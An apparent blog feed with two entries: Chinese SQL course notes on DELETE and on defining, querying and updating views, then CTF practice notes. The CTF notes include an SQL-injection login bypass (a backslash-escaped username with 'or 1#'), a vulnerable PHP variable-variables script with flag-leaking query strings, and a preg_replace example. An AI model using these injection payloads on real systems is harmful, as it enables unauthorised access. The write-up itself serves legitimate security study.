<h3 id="删除某一个元组的值"><a href="#删除某一个元组的值" class="headerlink" title="删除某一个元组的值"></a>删除某一个元组的值</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sno<span class="operator">=</span> <span class="string">&#x27;200215128&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401140233412.png" alt="在这里插入图片描述"></p>
<h3 id="删除多个元组的值"><a href="#删除多个元组的值" class="headerlink" title="删除多个元组的值"></a>删除多个元组的值</h3><p><strong>[例9] 删除所有的学生选课记录。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">FROM</span> SC；<span class="operator">/</span><span class="operator">/</span>这个我就不截图了</span><br></pre></td></tr></table></figure>
<h3 id="带子查询的删除语句"><a href="#带子查询的删除语句" class="headerlink" title="带子查询的删除语句"></a>带子查询的删除语句</h3><p>[例10] 删除计算机科学系所有学生的选课记录。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span>  <span class="string">&#x27;CS&#x27;</span><span class="operator">=</span>(</span><br><span class="line">   				<span class="keyword">SELECT</span> Sdept</span><br><span class="line">   				<span class="keyword">FROM</span> Student</span><br><span class="line">   				<span class="keyword">WHERE</span> Student.Sno<span class="operator">=</span>SC.Sno</span><br><span class="line">   			);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401140620653.png" alt="在这里插入图片描述"></p>
<h1 id="视图—VIEW"><a href="#视图—VIEW" class="headerlink" title="视图—VIEW"></a>视图—VIEW</h1><p><strong>视图的作用：</strong></p>
<ol>
<li>视图能够简化用户的操作</li>
<li>视图使用户能以多种角度看待同一数据</li>
<li>视图对重构数据库提供了一定程度的逻辑独立性</li>
<li>视图能够对机密数据提供安全保护</li>
<li>适当的利用视图可以更清晰的表达查询</li>
</ol>
<p><strong>视图的特点</strong></p>
<ul>
<li>虚表，是从一个或几个基本表（或视图）导出的表</li>
<li>只存放视图的定义，不存放视图对应的数据</li>
<li>基表中的数据发生变化，从视图中查询出的数据也随之改变</li>
</ul>
<p><strong>基于视图的操作</strong></p>
<ul>
<li>查询</li>
<li>删除</li>
<li>受限更新</li>
<li>定义基于该视图的新视图</li>
</ul>
<blockquote>
<p>视图的UPDATE、DELETE、INSERT INTO(有受限)，与基本表同步。</p>
</blockquote>
<h2 id="定义视图"><a href="#定义视图" class="headerlink" title="定义视图"></a>定义视图</h2><h3 id="建立视图"><a href="#建立视图" class="headerlink" title="建立视图"></a>建立视图</h3><ul>
<li><strong>语句格式</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span>  <span class="keyword">VIEW</span> <span class="operator">&lt;</span>视图名<span class="operator">&gt;</span>  [(<span class="operator">&lt;</span>列名<span class="operator">&gt;</span>  [，<span class="operator">&lt;</span>列名<span class="operator">&gt;</span>]…)]</span><br><span class="line"><span class="keyword">AS</span>  <span class="operator">&lt;</span>子查询<span class="operator">&gt;</span></span><br><span class="line">[<span class="keyword">WITH</span>  <span class="keyword">CHECK</span>  OPTION]；</span><br></pre></td></tr></table></figure>
<ul>
<li>组成视图的属性列名：全部省略或全部指定</li>
<li><code>子查询不允许</code>含有<code>ORDER BY</code>子句和<code>DISTINCT</code>短语</li>
<li>RDBMS执行CREATE VIEW语句时只是把视图定义存入<code>数据字典</code>，并不执行其中的SELECT语句。</li>
<li>在对视图查询时，按视图的定义从基本表中将数据查出。</li>
</ul>
<p><strong>[例1] 建立信息系IS学生的视图。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_Student</span><br><span class="line"><span class="keyword">AS</span> </span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span>    Student</span><br><span class="line"><span class="keyword">WHERE</span>  Sdept<span class="operator">=</span> <span class="string">&#x27;IS&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401141734215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>[例2]建立信息系学生的视图，并要求进行修改和插入操作时仍需保证该视图只有信息系IS的学生 。</strong><br><strong>对IS_Student视图的更新操作：</strong></p>
<ul>
<li>修改操作：自动加上Sdept= ‘IS’的条件</li>
<li>删除操作：自动加上Sdept= ‘IS’的条件</li>
<li>插入操作：自动检查Sdept属性值是否为’IS’<ul>
<li>如果不是，则拒绝该插入操作</li>
<li>如果没有提供Sdept属性值，则自动定义Sdept为’IS’</li>
</ul>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_Student</span><br><span class="line"><span class="keyword">AS</span> </span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span>  Student</span><br><span class="line"><span class="keyword">WHERE</span>  Sdept<span class="operator">=</span> <span class="string">&#x27;IS&#x27;</span></span><br><span class="line"><span class="keyword">WITH</span> <span class="keyword">CHECK</span> OPTION;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401142141109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>基于多个基表的视图</strong></p>
<p><strong>[例3] 建立信息系选修了1号课程的学生视图。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_S1(Sno,Sname,Grade)</span><br><span class="line"><span class="keyword">AS</span> </span><br><span class="line"><span class="keyword">SELECT</span> Student.Sno,Sname,Grade</span><br><span class="line"><span class="keyword">FROM</span>  Student,SC</span><br><span class="line"><span class="keyword">WHERE</span>  Sdept<span class="operator">=</span> <span class="string">&#x27;IS&#x27;</span> </span><br><span class="line"><span class="keyword">AND</span> Student.Sno<span class="operator">=</span>SC.Sno </span><br><span class="line"><span class="keyword">AND</span> SC.Cno<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401142857172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>基于视图的视图</strong></p>
<p><strong>[例4] 建立信息系选修了1号课程且成绩在90分以上的学生的视图。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_S2</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Grade</span><br><span class="line"><span class="keyword">FROM</span>  IS_S1</span><br><span class="line"><span class="keyword">WHERE</span>  Grade<span class="operator">&gt;=</span><span class="number">90</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401143210685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>带表达式的视图</strong></p>
<p><strong>[例5] 定义一个反映学生出生年份的视图。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span>  <span class="keyword">VIEW</span> BT_S(Sno,Sname,Sbirth)</span><br><span class="line"><span class="keyword">AS</span> </span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,<span class="number">2000</span><span class="operator">-</span>Sage</span><br><span class="line"><span class="keyword">FROM</span>  Student;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401143446220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>分组视图</strong></p>
<p><strong>[例6] 将学生的学号及他的平均成绩定义为一个视图</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span>  <span class="keyword">VIEW</span> S_G(Sno,Gavg)</span><br><span class="line"><span class="keyword">AS</span>  </span><br><span class="line"><span class="keyword">SELECT</span> Sno,<span class="built_in">AVG</span>(Grade)</span><br><span class="line"><span class="keyword">FROM</span>  SC</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401143653506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>不指定属性列</strong><br><strong>[例7]将Student表中所有女生记录定义为一个视图</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> F_Student(F_Sno,name,sex,age,dept)</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span>  Student</span><br><span class="line"><span class="keyword">WHERE</span> Ssex<span class="operator">=</span><span class="string">&#x27;女&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401143941159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>缺点：</strong></p>
<ul>
<li>修改基表Student的结构后，Student表与F_Student视图的映象关系被破坏，导致该视图不能正确工作。</li>
</ul>
<h3 id="删除视图"><a href="#删除视图" class="headerlink" title="删除视图"></a>删除视图</h3><p><strong>语句的格式:</strong></p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">DROP</span> <span class="built_in">VIEW</span> &lt;视图名&gt;;</span><br></pre></td></tr></table></figure>
<ul>
<li>该语句从<code>数据字典</code>中删除指定的视图定义</li>
<li>如果该视图上还导出了其他视图，使用<code>CASCADE级联</code>删除语句，把该视图和由它导出的所有视图一起删除</li>
<li>删除基表时，由该基表导出的所有视图定义都必须显式地使用DROP VIEW语句删除</li>
</ul>
<p><strong>［例8］ 删除视图IS_S1</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> IS_S1;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401145332456.png" alt="在这里插入图片描述"></p>
<ul>
<li>关于级联删除CASCADE，不知道为什么，删除模式、删除表、删除视图，有约束却删除不了，有待解决，先放这里。</li>
</ul>
<h2 id="查询视图"><a href="#查询视图" class="headerlink" title="查询视图"></a>查询视图</h2><p><strong>用户角度：<code>查询视图与查询基本表相同</code></strong></p>
<p><strong>RDBMS实现视图查询的方法</strong></p>
<ul>
<li>视图消解法（View Resolution）<ul>
<li>进行有效性检查</li>
<li>转换成等价的对基本表的查询</li>
<li>执行<code>修正</code>后的查询</li>
</ul>
</li>
</ul>
<p>关系数据库管理系统执行对视图的查询时，首先进行<code>有效性检查</code>，检查查询中涉及的表、视图等是否存在。如果存在，则从<code>数据字典</code>中取出视图的定义，把定义中的<code>子查询</code>和<code>用户的查询</code>结合起来，<code>转换成等价的对基本表的查询</code>，<code>然后再执行修正了的查询</code>。这一转换过程称为<code>视图消解</code>(view resolution)。</p>
<p><strong>[例9] 在信息系学生的视图中找出年龄小于等于20岁的学生。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>   Sno,Sage</span><br><span class="line"><span class="keyword">FROM</span>      IS_Student</span><br><span class="line"><span class="keyword">WHERE</span>   Sage<span class="operator">&lt;=</span><span class="number">20</span>;</span><br></pre></td></tr></table></figure>
<p>IS_Student视图的定义 (参见视图定义例1)<br><img src="https://img-blog.csdnimg.cn/20200401151344373.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200401150136382.png" alt="在这里插入图片描述"><br><strong>视图消解转换后的查询语句为：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  Sno，Sage       </span><br><span class="line"><span class="keyword">FROM</span>  Student</span><br><span class="line"><span class="keyword">WHERE</span>  Sdept<span class="operator">=</span> <span class="string">&#x27;IS&#x27;</span>  <span class="keyword">AND</span>  Sage<span class="operator">&lt;=</span><span class="number">20</span>；</span><br></pre></td></tr></table></figure>
<p><strong>[例10] 查询选修了1号课程的信息系学生</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  IS_Student.Sno,Sname</span><br><span class="line"><span class="keyword">FROM</span>     IS_Student,SC</span><br><span class="line"><span class="keyword">WHERE</span>  IS_Student.Sno <span class="operator">=</span>SC.Sno <span class="keyword">AND</span> SC.Cno<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401151417241.png" alt="在这里插入图片描述"></p>
<p><strong>视图消解法的局限</strong></p>
<ul>
<li>有些情况下，视图消解法不能生成正确查询。</li>
</ul>
<p><strong>[例11]在S_G视图中查询平均成绩在90分以上的学生学号和平均成绩</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span>   S_G</span><br><span class="line"><span class="keyword">WHERE</span>  Gavg<span class="operator">&gt;=</span><span class="number">90</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401151606151.png" alt="在这里插入图片描述"></p>
<p><strong>S_G视图的子查询定义：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> S_G (Sno,Gavg)</span><br><span class="line"><span class="keyword">AS</span> </span><br><span class="line"><span class="keyword">SELECT</span>  Sno,<span class="built_in">AVG</span>(Grade)</span><br><span class="line"><span class="keyword">FROM</span>  SC</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401151548147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">错误：</span><br><span class="line"><span class="keyword">SELECT</span> Sno,<span class="built_in">AVG</span>(Grade)</span><br><span class="line"><span class="keyword">FROM</span>     SC</span><br><span class="line"><span class="keyword">WHERE</span>  <span class="built_in">AVG</span>(Grade)<span class="operator">&gt;=</span><span class="number">90</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno;</span><br><span class="line"></span><br><span class="line">正确：</span><br><span class="line"><span class="keyword">SELECT</span>  Sno,<span class="built_in">AVG</span>(Grade)</span><br><span class="line"><span class="keyword">FROM</span>  SC</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">AVG</span>(Grade)<span class="operator">&gt;=</span><span class="number">90</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401151818567.png" alt="在这里插入图片描述"></p>
<h2 id="更新视图"><a href="#更新视图" class="headerlink" title="更新视图"></a>更新视图</h2><h3 id="更新数据—UPDATE-SET"><a href="#更新数据—UPDATE-SET" class="headerlink" title="更新数据—UPDATE SET"></a>更新数据—UPDATE SET</h3><p><strong>[例12] 将信息系学生视图IS_Student中学号201215125的学生姓名改为“刘辰”。</strong><br><img src="https://img-blog.csdnimg.cn/20200401152252972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE  IS_Student</span><br><span class="line"><span class="keyword">SET</span>  Sname<span class="operator">=</span> <span class="string">&#x27;刘辰&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span>  Sno<span class="operator">=</span> <span class="string">&#x27;201215125&#x27;</span>;</span><br><span class="line">转换后的语句：		<span class="operator">/</span><span class="operator">/</span>基本表和视图表同步更新</span><br><span class="line">UPDATE  Student</span><br><span class="line"><span class="keyword">SET</span> Sname<span class="operator">=</span> <span class="string">&#x27;刘辰&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> Sno<span class="operator">=</span> <span class="string">&#x27;201215125&#x27;</span> </span><br><span class="line"><span class="keyword">AND</span> Sdept<span class="operator">=</span> <span class="string">&#x27;IS&#x27;</span>; </span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401152617938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200401152432280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="插入数据—INSERT-INTO-1"><a href="#插入数据—INSERT-INTO-1" class="headerlink" title="插入数据—INSERT INTO"></a>插入数据—INSERT INTO</h3><p><strong>[例13] 向信息系学生视图IS_Student中插入一个新的学生记录：200215111，赵新，20岁</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">视图IS_Student的定义</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_Student</span><br><span class="line"><span class="keyword">AS</span> </span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span>    Student</span><br><span class="line"><span class="keyword">WHERE</span>  Sdept<span class="operator">=</span> <span class="string">&#x27;IS&#x27;</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>如果加了<span class="keyword">WITH</span> <span class="keyword">CHECK</span> OPTION，则视图不能进行插入数据操作</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_Student</span><br><span class="line"><span class="keyword">AS</span> </span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span>  Student</span><br><span class="line"><span class="keyword">WHERE</span>  Sdept<span class="operator">=</span> <span class="string">&#x27;IS&#x27;</span></span><br><span class="line"><span class="keyword">WITH</span> <span class="keyword">CHECK</span> OPTION;</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>插入数据</span><br><span class="line"><span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">INTO</span> IS_Student</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="string">&#x27;200215111&#x27;</span>,<span class="string">&#x27;赵新&#x27;</span>,<span class="number">20</span>);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>插入后基本表Student字段Sdept为空，视图表IS_Student无数据</span><br><span class="line">转换为对基本表的更新：</span><br><span class="line"><span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">INTO</span>   Student(Sno,Sname,Sage,Sdept)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="string">&#x27;200215129&#x27;</span>,<span class="string">&#x27;赵新2&#x27;</span>,<span class="number">20</span>,<span class="string">&#x27;IS&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401154939170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200401154949177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="删除数据—DELETE"><a href="#删除数据—DELETE" class="headerlink" title="删除数据—DELETE"></a>删除数据—DELETE</h3><p><strong>[例14]删除信息系学生视图IS_Student中学号为200215129的记录</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">FROM</span> IS_Student</span><br><span class="line"><span class="keyword">WHERE</span> Sno<span class="operator">=</span> <span class="string">&#x27;200215129&#x27;</span>;</span><br><span class="line">转换为对基本表的更新：</span><br><span class="line"><span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sno<span class="operator">=</span> <span class="string">&#x27;200215129&#x27;</span> <span class="keyword">AND</span> Sdept<span class="operator">=</span> <span class="string">&#x27;IS&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200401155510155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200401155515911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="更新视图的限制"><a href="#更新视图的限制" class="headerlink" title="更新视图的限制"></a>更新视图的限制</h3><ul>
<li><code>更新视图的限制：</code>一些视图是不可更新的，因为对这些视图的更新不能唯一地有意义地转换成对相应基本表的更新</li>
</ul>
<p><strong>例：视图S_G为不可更新视图。</strong><br><img src="https://img-blog.csdnimg.cn/20200401160322767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE  S_G</span><br><span class="line"><span class="keyword">SET</span>          Gavg<span class="operator">=</span><span class="number">90</span></span><br><span class="line"><span class="keyword">WHERE</span>  Sno<span class="operator">=</span> <span class="string">&#x27;200215121&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>这个对视图的更新无法转换成对基本表SC的更新</p>
<p><img src="https://img-blog.csdnimg.cn/20200401160413759.png" alt="在这里插入图片描述"></p>
<ul>
<li>允许对行列子集视图进行更新</li>
<li>对其他类型视图的更新不同系统有不同限制</li>
</ul>
]]></content>
      <categories>
        <category>share</category>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>buu30解刷题记录</title>
    <url>/2021/02/01/%E5%AF%92%E5%81%87buu30%E8%A7%A3%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>记录一些在刷题过程中，发现的一些有趣的题目</p>
<a id="more"></a>


<h2 id="忘记哪题了"><a href="#忘记哪题了" class="headerlink" title="(忘记哪题了)"></a>(忘记哪题了)</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">&#x27;$_POST[&quot;username&quot;]&#x27;</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">&#x27;$_POST[&quot;password&quot;]&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>显示了后端的SQL语句，我们可以使用\转义符转义username后面的引号，令username的第一个引号和password的第一个引号闭合，逃逸出password第一个引号后面的内容</p>
<p>如输入</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">username</span>=admin\</span><br><span class="line"><span class="attr">password</span>=or <span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>　　数据库查询语句事实上变成了这样：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">&#x27;admin\&#x27;</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">&#x27;or 1#&#x27;</span>;</span><br></pre></td></tr></table></figure>




<hr>
<h2 id="（忘记哪题了）"><a href="#（忘记哪题了）" class="headerlink" title="（忘记哪题了）"></a>（忘记哪题了）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
<ol>
<li>?yds=flag</li>
<li>?is=flag&amp;flag=flag</li>
</ol>
<hr>
<h2 id="（忘记哪题了）-1"><a href="#（忘记哪题了）-1" class="headerlink" title="（忘记哪题了）"></a>（忘记哪题了）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;123abc&#x27;</span>;</span><br><span class="line"><span class="keyword">print</span>(preg_replace(<span class="string">&#x27;/(\S)(\S)/i&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>=》  <code>strtolower(&quot;1&quot;)strtolower(&quot;3&quot;)strtolower(&quot;b&quot;)</code></p>
<hr>
